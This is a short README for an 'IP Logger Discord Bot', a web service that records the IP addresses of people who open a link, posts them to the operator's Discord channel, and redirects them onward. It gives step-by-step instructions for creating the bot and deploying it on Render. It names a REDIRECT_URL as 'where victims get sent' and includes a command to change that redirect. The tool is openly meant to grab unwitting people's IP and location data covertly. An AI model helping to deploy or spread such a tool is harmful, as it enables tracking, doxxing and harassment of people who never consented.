# IP Logger Discord Bot

A full IP logger with Discord bot integration.

## Setup

### 1. Discord Bot
1. Go to https://discord.com/developers/applications
2. Create new application → Bot → Create Bot
3. Copy the token → Enable all Privileged Gateway Intents
4. Invite bot with `bot` + `applications.commands` scopes

### 2. Get Channel ID
- Enable Developer Mode in Discord (Settings → Advanced)
- Right-click your channel → Copy ID

### 3. Deploy to Render
1. Push this repo to GitHub
2. Go to https://render.com → New Web Service
3. Connect your GitHub repo
4. Set:
   - Build Command: `pip install -r requirements.txt`
   - Start Command: `python app.py`
5. Add Environment Variables:
   - `DISCORD_BOT_TOKEN` = your bot token
   - `DISCORD_CHANNEL_ID` = your channel ID
   - `REDIRECT_URL` = where victims get sent (optional)
   - `IPINFO_TOKEN` = your ipinfo.io token (optional)

### Commands
- `/status` — Check bot status
- `/setredirect <url>` — Change redirect URL on the fly
